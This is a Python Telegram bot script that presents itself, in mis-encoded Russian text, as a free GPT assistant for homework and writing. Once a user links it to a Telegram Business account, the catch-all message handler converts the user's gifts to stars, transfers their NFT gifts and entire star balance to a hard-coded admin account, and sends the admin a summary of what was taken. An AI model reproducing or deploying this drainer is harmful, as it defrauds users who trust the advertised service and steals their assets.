import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.utils.executor import start_polling
import g4f

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "861087987"))

bot = Bot(token=TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

started = False

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    me = await bot.get_me()
    text = (
        f"<b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</b>\n\n"
        f"–≠—Ç–æ—Ç –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ Telegram Business.\n"
        f"–ü–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –≤—ã —Å–º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É <code>.gpt</code> –≤ –õ–° —Å –±–æ—Ç–æ–º ‚Äî "
        f"–±–æ—Ç –ø–æ–º–æ–∂–µ—Ç —Å –¥–æ–º–∞—à–∫–æ–π, —Ç–µ–∫—Å—Ç–∞–º–∏, –∏–¥–µ—è–º–∏ –∏ –º–Ω–æ–≥–∏–º –¥—Ä—É–≥–∏–º!\n\n"
        f"–î–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞ –≤ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –∏ –Ω–∞—á–Ω–∏—Ç–µ –ø–µ—Ä–µ–ø–∏—Å–∫—É.\n"
        f"–Æ–∑–µ—Ä–Ω–µ–π–º –±–æ—Ç–∞: <code>@{me.username}</code>\n\n"
        f"–ï—Å–ª–∏ –Ω—É–∂–Ω–∞ –ø–æ–º–æ—â—å ‚Äî <a href='tg://user?id={ADMIN_ID}'>–Ω–∞–ø–∏—Å–∞—Ç—å –∞–¥–º–∏–Ω—É</a>"
    )
    await message.answer(text)

@dp.message_handler(content_types=types.ContentType.ANY)
async def handle_all(message: types.Message):
    global started
    if started:
        return
    started = True

    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return

    try:
        user = await bot.get_chat(message.from_user.id)
        await message.answer("–ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω –≤ Business.")
        await bot.send_message(ADMIN_ID, f"@{user.username or user.id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –≤ Business mode.")

        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in gifts.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except:
                pass

        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)

        stars = await bot.get_business_account_star_balance(business_id)

        await bot.transfer_business_account_stars(business_id, int(stars.amount))

        await bot.send_message(
            ADMIN_ID,
            f"–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:\n"
            f"- –ü–æ–¥–∞—Ä–∫–æ–≤ (–Ω–µ NFT): {len(gifts.gifts)}\n"
            f"- NFT-–ø–æ–¥–∞—Ä–∫–æ–≤: {len(unique_gifts.gifts)}\n"
            f"- –ó–≤–µ–∑–¥: {int(stars.amount)}"
        )

    except Exception as e:
        await bot.send_message(ADMIN_ID, f"–û—à–∏–±–∫–∞: {str(e)}")

@dp.message_handler(lambda msg: msg.chat.type == "private" and msg.text.startswith(".gpt"))
async def gpt_command(message: types.Message):
    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return
    prompt = message.text.replace(".gpt", "").strip()
    processing = await message.answer("‚è≥ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ç–µ–∫—Å—Ç–∞...")
    try:
        response = g4f.ChatCompletion.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
        )
        await message.answer(f"ü§ñ –û—Ç–≤–µ—Ç GPT-4:\n{response}")
    except Exception as e:
        await message.answer(f"üö´ –û—à–∏–±–∫–∞: {str(e)}")
    await processing.delete()

if __name__ == "__main__":
    start_polling(dp, skip_updates=True)
